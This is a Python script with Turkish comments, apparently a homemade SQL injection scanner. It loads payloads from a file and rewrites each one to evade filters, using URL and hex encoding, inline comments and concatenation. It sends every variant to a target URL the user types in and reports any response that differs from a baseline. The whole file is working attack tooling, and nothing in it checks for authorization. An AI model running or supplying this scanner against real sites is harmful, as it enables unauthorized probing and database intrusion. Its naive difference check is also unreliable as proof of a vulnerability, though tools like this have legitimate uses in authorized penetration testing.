import requests
import urllib.parse

# Dosyayı açıp payload'ları okuyan fonksiyon
def load_payloads(file_path):
    with open(file_path, 'r') as file:
        payloads = [line.strip() for line in file.readlines()]
    return payloads

# Obfuscation yöntemleri
def obfuscate_payloads(payload):
    obfuscations = []

    # URL Encoding
    obfuscations.append(urllib.parse.quote(payload))

    # Hex Encoding
    obfuscations.append("".join([f"%{hex(ord(c))[2:]}" for c in payload]))

    # String Concatenation (örneğin `UNION SELECT` ifadesini `UNION||SELECT` yapma)
    obfuscations.append("||".join(payload.split(" ")))

    # White-space Manipulation
    obfuscations.append(payload.replace(" ", "/**/"))

    # Comment Injection
    obfuscations.append(payload + "--")

    # Inline Comments (örneğin: `UNION/**/SELECT`)
    obfuscations.append("/**/".join(payload.split(" ")))

    # Alternative Syntax (örneğin `SELECT CHAR(117, 110, 105, 111, 110)`)
    if "UNION" in payload:
        obfuscations.append(payload.replace("UNION", "UNION/**/"))
    if "SELECT" in payload:
        obfuscations.append(payload.replace("SELECT", "SELECT/**/"))
    
    return obfuscations

# Normal yanıtı almak için fonksiyon
def get_normal_response(url, headers=None):
    response = requests.get(url, headers=headers, timeout=5)
    return response.text  # Normal yanıt içeriği

# SQL injection açığı test eden fonksiyon
def test_sql_injection(url, payloads):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }

    # İlk olarak normal yanıt içeriğini alalım
    normal_response_content = get_normal_response(url, headers)
    print("Normal yanıt alındı ve referans olarak kaydedildi.")

    for payload in payloads:
        # Her payload için obfuscate edilmiş varyasyonları dene
        obfuscated_payloads = obfuscate_payloads(payload)
        
        for obf_payload in obfuscated_payloads:
            test_url = f"{url}{obf_payload}"
            response = requests.get(test_url, headers=headers, timeout=5 )
            print(f"GET isteği gönderildi: {test_url}")

            # Yanıt durumu kodunu kontrol et
            print(f"Yanıt durumu: {response.status_code}")

            # Yanıt içeriğini normal yanıt ile karşılaştır
            if response.text != normal_response_content:
                print(f"Muhtemel SQL injection belirtisi! Payload: {obf_payload}")
                print("Normal yanıt ile fark tespit edildi.")
            else:
                print(f"Denendi, ama başarısız oldu. Payload: {obf_payload}")

# Dosya yolunu belirt 
file_path = '/home/kullanıcıadi/dosyanınbulunduğudizin/sorgu.txt'

# Payload dosyasını oku
payloads = load_payloads(file_path)

# Hedef URL'yi belirt
target_url = input("Hedef URL'yi girin: ")

# SQL injection testini başlat
test_sql_injection(target_url, payloads)
